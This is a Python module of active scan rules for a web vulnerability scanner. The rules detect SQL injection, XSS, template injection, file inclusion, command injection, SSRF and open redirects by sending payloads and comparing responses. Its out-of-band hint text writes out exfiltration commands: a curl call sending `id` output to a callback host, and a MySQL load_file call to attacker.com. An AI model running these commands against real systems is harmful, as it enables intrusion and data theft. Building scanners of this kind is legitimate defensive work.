"""Rule implementations for the enhanced active scanner."""

from __future__ import annotations

import re
import time
import uuid
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse

from argusai.core.context import Context
from argusai.core.finding import Finding, Severity
from argusai.core.payloads import LFI_FILE_RE, PayloadLibrary, RCE_OUTPUT_RE, SQL_ERROR_RE, SSTI_MATH_RE

# ---------------------------------------------------------------------------
# Response Differ
# ---------------------------------------------------------------------------

@dataclass
class Baseline:
    status: int
    body: str
    length: int
    elapsed_s: float
    headers: dict[str, str] = field(default_factory=dict)


class ResponseDiffer:
    """Detects blind vulnerabilities by comparing responses to a baseline."""

    def __init__(self, baseline: Baseline) -> None:
        self.baseline = baseline

    def has_significant_diff(self, response: Any, threshold: float = 0.3) -> bool:
        body = response.text if hasattr(response, "text") else ""
        status = response.status_code if hasattr(response, "status_code") else 0
        if status != self.baseline.status:
            return True
        if self.baseline.length == 0:
            return len(body) > 100
        diff_ratio = abs(len(body) - self.baseline.length) / max(self.baseline.length, 1)
        return diff_ratio > threshold

    def time_based_signal(
        self,
        response_elapsed: float,
        injected_delay: float,
        tolerance: float = 0.5,
    ) -> bool:
        """Detect time-based blind injection.

        Returns True if response took at least ``injected_delay - tolerance``
        seconds longer than baseline.
        """
        delta = response_elapsed - self.baseline.elapsed_s
        return delta >= (injected_delay - tolerance)


# ---------------------------------------------------------------------------
# OOB Hints
# ---------------------------------------------------------------------------

class OOBHint:
    """Generates out-of-band detection suggestions for blind classes."""

    @staticmethod
    def suggest_dns_callback() -> str:
        """Return a unique subdomain suggestion for DNS callback."""
        return f"argusai-{uuid.uuid4().hex[:12]}.oob.example.com"

    @staticmethod
    def format_hint(category: str) -> str:
        hints = {
            "ssrf": "For blind SSRF, point the payload at an OOB callback (Burp Collaborator, interact.sh, or your own DNS-logging server) and watch for incoming requests.",
            "xxe": "For blind XXE, deliver an external DTD that exfiltrates file contents to your OOB endpoint.",
            "rce": "For blind RCE, run `curl http://your-oob/$(id|base64)` and watch your DNS/HTTP log.",
            "sqli": "For blind SQLi, exfiltrate via DNS using load_file('//attacker.com/...') (MySQL) or similar dialect-specific functions.",
        }
        return hints.get(category, "Consider out-of-band detection (DNS callback) for blind variants.")


# ---------------------------------------------------------------------------
# Scan Rules
# ---------------------------------------------------------------------------

class ScanRule(ABC):
    """Base class for individual scan rules."""

    category: str = ""
    severity: Severity = Severity.MEDIUM
    cwe: str | None = None

    @abstractmethod
    async def test(
        self,
        url: str,
        param: str,
        ctx: Context,
        differ: ResponseDiffer,
    ) -> Finding | None:
        ...


class SQLiRule(ScanRule):
    category = "sqli"
    severity = Severity.HIGH
    cwe = "CWE-89"

    async def test(self, url, param, ctx, differ):
        # Error-based + boolean diff + time-based
        for payload in PayloadLibrary.SQLI[:15]:
            test_url = _inject(url, param, payload.value)
            t0 = time.perf_counter()
            try:
                r = await ctx.get(test_url)
            except Exception:
                continue
            elapsed = time.perf_counter() - t0
            body = r.text

            # Error-based
            if SQL_ERROR_RE.search(body) and not SQL_ERROR_RE.search(differ.baseline.body):
                return Finding(
                    id=f"scanner.sqli.error",
                    category="injection",
                    severity=Severity.HIGH,
                    title=f"SQL injection (error-based) on `{param}`",
                    url=test_url,
                    description="A SQL error appeared after injecting the payload — confirmed SQL injection.",
                    evidence={
                        "param": param,
                        "payload": payload.value,
                        "snippet": _snippet(body, SQL_ERROR_RE),
                    },
                    remediation="Use parameterised queries / prepared statements.",
                    cwe="CWE-89",
                )

            # Time-based blind
            if "SLEEP" in payload.value.upper() or "WAITFOR" in payload.value.upper() or "PG_SLEEP" in payload.value.upper():
                if differ.time_based_signal(elapsed, injected_delay=3.0):
                    return Finding(
                        id=f"scanner.sqli.time",
                        category="injection",
                        severity=Severity.HIGH,
                        title=f"SQL injection (time-based blind) on `{param}`",
                        url=test_url,
                        description=f"Response delayed by {elapsed:.2f}s after injecting time-based payload.",
                        evidence={
                            "param": param,
                            "payload": payload.value,
                            "baseline_s": round(differ.baseline.elapsed_s, 3),
                            "test_s": round(elapsed, 3),
                        },
                        remediation="Use parameterised queries / prepared statements.",
                        cwe="CWE-89",
                    )
        return None


class XSSReflectRule(ScanRule):
    category = "xss"
    severity = Severity.MEDIUM
    cwe = "CWE-79"

    async def test(self, url, param, ctx, differ):
        for payload in PayloadLibrary.XSS[:10]:
            test_url = _inject(url, param, payload.value)
            try:
                r = await ctx.get(test_url)
            except Exception:
                continue
            body = r.text
            # Reflection without escaping
            if payload.value in body:
                # Confirm by checking that a benign sentinel reflects too
                return Finding(
                    id=f"scanner.xss.reflected",
                    category="xss",
                    severity=Severity.MEDIUM,
                    title=f"Reflected XSS payload on `{param}` (raw HTML reflection)",
                    url=test_url,
                    description=(
                        "An XSS payload was reflected verbatim into the response body. "
                        "Confirm execution with the browser-driven `xss` check; "
                        "raw reflection alone strongly suggests reflected XSS."
                    ),
                    evidence={
                        "param": param,
                        "payload": payload.value[:200],
                        "snippet": _snippet_str(body, payload.value),
                    },
                    remediation="Apply context-aware HTML escaping when rendering user input.",
                    cwe="CWE-79",
                )
        return None


class SSTIRule(ScanRule):
    category = "ssti"
    severity = Severity.HIGH
    cwe = "CWE-94"

    async def test(self, url, param, ctx, differ):
        for payload in PayloadLibrary.SSTI[:5]:
            test_url = _inject(url, param, payload.value)
            try:
                r = await ctx.get(test_url)
            except Exception:
                continue
            body = r.text
            if SSTI_MATH_RE.search(body) and not SSTI_MATH_RE.search(differ.baseline.body):
                return Finding(
                    id=f"scanner.ssti",
                    category="injection",
                    severity=Severity.HIGH,
                    title=f"Server-side template injection on `{param}`",
                    url=test_url,
                    description=f"Payload `{payload.value}` was evaluated server-side (output contains 49).",
                    evidence={"param": param, "payload": payload.value},
                    remediation="Never render user input as template source.",
                    cwe="CWE-94",
                )
        return None


class LFIRule(ScanRule):
    category = "lfi"
    severity = Severity.HIGH
    cwe = "CWE-22"

    async def test(self, url, param, ctx, differ):
        for payload in PayloadLibrary.LFI[:8]:
            test_url = _inject(url, param, payload.value)
            try:
                r = await ctx.get(test_url)
            except Exception:
                continue
            body = r.text
            if LFI_FILE_RE.search(body) and not LFI_FILE_RE.search(differ.baseline.body):
                return Finding(
                    id=f"scanner.lfi",
                    category="injection",
                    severity=Severity.HIGH,
                    title=f"Local file inclusion on `{param}`",
                    url=test_url,
                    description="Response contains system file content after path traversal.",
                    evidence={
                        "param": param,
                        "payload": payload.value,
                        "snippet": _snippet(body, LFI_FILE_RE),
                    },
                    remediation="Validate file paths server-side; use allow-listed file IDs.",
                    cwe="CWE-22",
                )
        return None


class RCERule(ScanRule):
    category = "rce"
    severity = Severity.CRITICAL
    cwe = "CWE-78"

    async def test(self, url, param, ctx, differ):
        for payload in PayloadLibrary.RCE[:8]:
            test_url = _inject(url, param, payload.value)
            t0 = time.perf_counter()
            try:
                r = await ctx.get(test_url)
            except Exception:
                continue
            elapsed = time.perf_counter() - t0
            body = r.text

            if RCE_OUTPUT_RE.search(body) and not RCE_OUTPUT_RE.search(differ.baseline.body):
                return Finding(
                    id=f"scanner.rce.output",
                    category="injection",
                    severity=Severity.CRITICAL,
                    title=f"Command injection on `{param}` (output observed)",
                    url=test_url,
                    description="Command output (uid=/gid=) appeared after injecting shell metacharacters.",
                    evidence={
                        "param": param,
                        "payload": payload.value,
                        "snippet": _snippet(body, RCE_OUTPUT_RE),
                    },
                    remediation=(
                        "Never pass user input to shell commands. Use parameterised "
                        "subprocess invocation (no shell=True) or libraries with safe APIs."
                    ),
                    cwe="CWE-78",
                )

            if "sleep" in payload.value.lower() and differ.time_based_signal(elapsed, injected_delay=5.0):
                return Finding(
                    id=f"scanner.rce.time",
                    category="injection",
                    severity=Severity.CRITICAL,
                    title=f"Command injection on `{param}` (time-based blind)",
                    url=test_url,
                    description=f"Response delayed by {elapsed:.2f}s after injecting sleep-based RCE.",
                    evidence={
                        "param": param,
                        "payload": payload.value,
                        "test_s": round(elapsed, 3),
                        "baseline_s": round(differ.baseline.elapsed_s, 3),
                    },
                    remediation="Same as above; never invoke shell with user input.",
                    cwe="CWE-78",
                )
        return None


class SSRFRule(ScanRule):
    category = "ssrf"
    severity = Severity.HIGH
    cwe = "CWE-918"

    async def test(self, url, param, ctx, differ):
        # Only meaningful on URL-like params
        if not any(k in param.lower() for k in ("url", "uri", "redirect", "callback", "next", "return", "host", "ref")):
            return None
        for payload in PayloadLibrary.SSRF[:6]:
            test_url = _inject(url, param, payload.value)
            try:
                r = await ctx.get(test_url)
            except Exception:
                continue
            body = r.text
            # Cloud metadata signals
            if "ami-id" in body or "instance-id" in body or "iam/security-credentials" in body:
                return Finding(
                    id=f"scanner.ssrf",
                    category="injection",
                    severity=Severity.HIGH,
                    title=f"SSRF on `{param}` (cloud metadata reachable)",
                    url=test_url,
                    description="Response contains cloud metadata content — server fetches user-controlled URL.",
                    evidence={"param": param, "payload": payload.value, "snippet": body[:300]},
                    remediation="Validate URL targets against an allow-list; block link-local IPs.",
                    cwe="CWE-918",
                )
            # Heuristic: response significantly different from baseline implies fetch happened
            if differ.has_significant_diff(r) and "127.0.0.1" in payload.value:
                return Finding(
                    id=f"scanner.ssrf.localhost",
                    category="injection",
                    severity=Severity.MEDIUM,
                    title=f"Possible SSRF on `{param}` (localhost reachable)",
                    url=test_url,
                    description="Response differs significantly when payload targets localhost.",
                    evidence={
                        "param": param,
                        "payload": payload.value,
                        "oob_hint": OOBHint.format_hint("ssrf"),
                    },
                    remediation="Validate URL targets against an allow-list.",
                    cwe="CWE-918",
                )
        return None


class OpenRedirectRule(ScanRule):
    category = "open_redirect"
    severity = Severity.MEDIUM
    cwe = "CWE-601"

    async def test(self, url, param, ctx, differ):
        if not any(k in param.lower() for k in ("redirect", "url", "next", "return", "callback", "target", "to")):
            return None
        for payload in PayloadLibrary.OPEN_REDIRECT[:4]:
            test_url = _inject(url, param, payload.value)
            try:
                # Don't auto-follow redirects so we can inspect the Location header
                r = await ctx.request("GET", test_url, follow_redirects=False)
            except Exception:
                continue
            location = r.headers.get("location", "") if hasattr(r, "headers") else ""
            if location and ("evil.com" in location.lower() or "javascript:" in location.lower() or location.startswith("//evil")):
                return Finding(
                    id=f"scanner.open_redirect",
                    category="injection",
                    severity=Severity.MEDIUM,
                    title=f"Open redirect on `{param}`",
                    url=test_url,
                    description=f"Server redirects to attacker-controlled URL via Location header: {location[:200]}",
                    evidence={"param": param, "payload": payload.value, "location": location[:300]},
                    remediation="Use allow-list for redirect destinations; reject external URLs.",
                    cwe="CWE-601",
                )
        return None


def _inject(url: str, name: str, value: str) -> str:
    u = urlparse(url)
    q = parse_qsl(u.query, keep_blank_values=True)
    if any(k == name for k, _ in q):
        q = [(k, value if k == name else v) for k, v in q]
    else:
        q.append((name, value))
    return u._replace(query=urlencode(q)).geturl()


def _snippet(text: str, pat: re.Pattern[str], pad: int = 80) -> str:
    m = pat.search(text)
    if not m:
        return ""
    s = max(0, m.start() - pad)
    e = min(len(text), m.end() + pad)
    return text[s:e].replace("\n", " ")


def _snippet_str(text: str, needle: str, pad: int = 80) -> str:
    idx = text.find(needle)
    if idx < 0:
        return ""
    s = max(0, idx - pad)
    e = min(len(text), idx + len(needle) + pad)
    return text[s:e].replace("\n", " ")
